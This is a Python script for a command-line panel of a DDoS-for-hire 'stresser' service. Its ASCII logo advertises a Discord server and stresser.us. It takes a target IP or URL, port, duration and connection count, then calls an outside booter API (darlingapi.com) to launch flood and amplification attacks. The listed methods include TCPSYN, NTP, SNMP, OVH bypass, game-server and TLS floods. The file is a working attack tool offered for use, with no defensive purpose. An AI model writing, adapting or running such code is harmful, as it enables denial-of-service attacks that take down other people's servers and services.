# -*- coding: utf-8 -*-
from httpx import get
from os import system,_exit
from sys import stdout
from time import sleep
from shutil import get_terminal_size
from sty import fg

system("CHCP 65001")
exit=lambda _: _exit(0)
_KEY="KEY_HERE"
_METHODS=["TCPRAW","TCPSYN","TCPACK","TCPTFO","TCPTLS","TCPAMP","VALVE","FIVEM","OVHAMP","OVHTCP","OVHUDP","SNMP","WSD","DVR","NTP","ARD","IGMP","GRE","ESP","IPRAND","TLSV1","TLSV2","UDPBYPASS"]
__builtins__.print = lambda text="",end="\r\n": stdout.write(f"{text}{end}");stdout.flush()
clearconsole = lambda : system("cls || clear")

class color:
    def __init__(self)->None:
        self.text = 15
        self.invite = 82
        self.logo = 117
        self.line = 225
_COLOR=color()

def makec(text,color):
    return f"{fg(color)}{text}{fg.rs}"

def printc(text):
    for l in text.splitlines():
        print(f"\t\t     {l}")

def logo():
    clearconsole()
    printc(makec("""\t         ▄                                                                    
\t ▄▄▄▄  ▄██▄  ▄▄▄ ▄▄    ▄▄▄▄   ▄▄▄▄   ▄▄▄▄    ▄▄▄▄  ▄▄▄ ▄▄     ▄▄▄ ▄▄▄   ▄▄▄▄  
\t██▄ ▀   ██    ██▀ ▀▀ ▄█▄▄▄██ ██▄ ▀  ██▄ ▀  ▄█▄▄▄██  ██▀ ▀▀     ██  ██  ██▄ ▀  
\t▄ ▀█▄▄  ██    ██     ██      ▄ ▀█▄▄ ▄ ▀█▄▄ ██       ██         ██  ██  ▄ ▀█▄▄ 
\t█▀▄▄█▀  ▀█▄▀ ▄██▄     ▀█▄▄▄▀ █▀▄▄█▀ █▀▄▄█▀  ▀█▄▄▄▀ ▄██▄        ▀█▄▄▀█▄ █▀▄▄█▀ """,_COLOR.logo))
    printc(makec("\t\t\tdiscord.gg/cyber-hubs and stresser.us\n",_COLOR.invite))

def realint(s):
    try:
        return int(s)
    except: 
        return -1

def isgoodipv4(s)->bool:
    pieces = s.split('.')
    if len(pieces) != 4: return False
    try: return all(0<=int(p)<256 for p in pieces)
    except ValueError: return False

def isgoodint(p,max)->bool:
    p=realint(p)
    if p <= max and not (p <= 0): 
        return True
    return False

def request(ip,port,time,conn,method):
    try:
        for _ in range(int(conn)):
            resp=get(f"https://darlingapi.com/?key={_KEY}&host={ip}&port={port}&time={time}&method={method}").json()
            #print(resp)
            sleep(0.2)
        if resp["error"] == "yes":
            return {"ok":False,"data":resp["data"]}
        return {"ok":True,"data":resp["data"]}
    except:return {"ok":False,"data":"api down?"}

def helpcom():
    logo()
    printc(f"""\t\t {makec("╔═════════╦══════════════════════════════════════════════════╗",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPRAW, TCPSYN, TCPACK, TCPTFO, TCPTLS, TCPAMP",_COLOR.text)} {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP, OVHTCP, OVHUDP",_COLOR.text)}           {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> SNMP, WSD, DVR, NTP, ARD",_COLOR.text)}                       {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IGMP, GRE, ESP, IPRAND",_COLOR.text)}                         {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> TLSv1, TLSv2",_COLOR.text)}                                   {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPBYPASS",_COLOR.text)}                                      {makec("║",_COLOR.line)}
\t\t {makec("╚═════════╩══════════════════════════════════════════════════╝",_COLOR.line)}""")

def clearcom():
    logo()
    print("")

def main():
    print("\n"*14)
    stdout.write("".center(50))
    for cha in "welcome back, larina.":
        stdout.write(cha)
        stdout.flush()
        sleep(0.1)
    sleep(2)
    helpcom()
    while 1:
        rawcommands=input(f'{makec("larina@us",196)}{makec(":~$",_COLOR.text)}{fg(81)} ').split(" ")
        commands=rawcommands[0].upper()
        args=rawcommands[1:]
        if commands in _METHODS:
            if len(args) < 3 or not (commands.startswith("TLS") or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10)):
                print(makec(f"[*] {commands} <ip/url> <port> <time> <conn>",99))
            else:
                resp=request(args[0],args[1],args[2],args[3],commands)
                print(makec(resp["data"],46 if resp["ok"] == True else 9))
        else:   
            try:
                commandslist[commands]()
            except:
                print(makec("[!] command not found",11))

   
if __name__ == "__main__":
    commandslist={"EXIT":exit,"QUIT":exit,"HELP":helpcom,"CLEAR":clearcom}
    sizec=get_terminal_size().columns-3
    system("mode 130,30")
    system("title stresser us panel private ^<3")
    main()